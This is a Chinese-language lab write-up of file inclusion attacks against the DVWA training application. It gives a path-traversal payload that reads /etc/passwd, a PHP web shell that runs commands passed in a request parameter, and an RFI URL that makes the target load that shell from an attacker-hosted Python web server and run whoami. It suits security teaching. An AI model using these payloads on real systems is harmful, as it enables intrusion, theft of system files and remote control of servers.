## 一、文件包含漏洞(File Inclusion)
### 1.1 攻击逻辑
- 利用服务器“偷懒”，有些网页为了方便，直接根据URL里的参数去读取服务器上某个文件并显示出来，可以读取敏感文件
### 1.2 文件包含分类
- 本地文件包含(LFI)：读取服务器本地的敏感文件
- 远程文件包含(RFL)：让服务器加载并执行一个放在别处(如Kali攻击机上)的恶意脚本。一旦成功，效果和上传Web Shell一样，直接控制服务器
## 二、本地文件包含(LFI)信息窃取
- DVWA切换File Inclusion模块，三个按钮`file1.php`，`file2.php`，`file3.php`，任选一个
- URL变成`1`，暗示服务器正根据`page`参数的值去包含一个文件，可以试着改变这个值
- 构造LFI Payload：
   - 目标是读取`/etc/passwd`文件，这里存放Linux系统用户列表的文件
   - 需要用`../`字符串来跳出当前目录，一层层返回到根目录
   - 最终Payload：`../../../../../../../../etc/passwd`
   - 最终URL：`http://192.168.174.130/dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd`
   - 结果：在网页看到`/etc/passwd`文件的全部内容
## 三、远程文件包含(RFI)获取控制权
-  准备武器(Web Shell)：`shell.php`
```
<?php
    if (isset($_REQUEST['cmd'])) {
        system($_REQUEST['cmd']);
    }
?>
```
- 架设"军火库"(Web服务器)：
   - 为了让DVWA服务器能访问到`shell.php`，选哟在Kali上启动一个临时的Web服务器
   - 在Kali中，打开新终端，进入到`shell.php`所在的目录(桌面)，执行`python3 -m http.server 8000`，启动一个监听在`8000`端口的Web服务器
- 构造RFI Payload：
   - 让`page`参数去加载一个远程地址，即刚刚架设号的Web服务器上的`shell.php`
   - 最终Payload：`http://192.168.174.129:8000/shell.php`
- 最终攻击:
   - 浏览器地址栏`page=`后门的内容，替换成RFI Payload，最终URL：`http://192.168.174.130/dvwa/vulnerabilities/fi/?page=http://192.168.174.129:8000/shell.php`
   - 观察Pyhton服务器终端，会看到访问日志，证明DVWA服务器下载了`shell.php`
- 验证控制权：
   - 在URL后加上`&cmd=`参数来执行命令
   - `http://192.168.174.130/dvwa/vulnerabilities/fi/?page=http://192.168.174.129:8000/shell.php&cmd=whoami`，网页显示`www-data`，证明通过RFI漏洞，成功在服务器上执行了任意命令。
## 四、总结
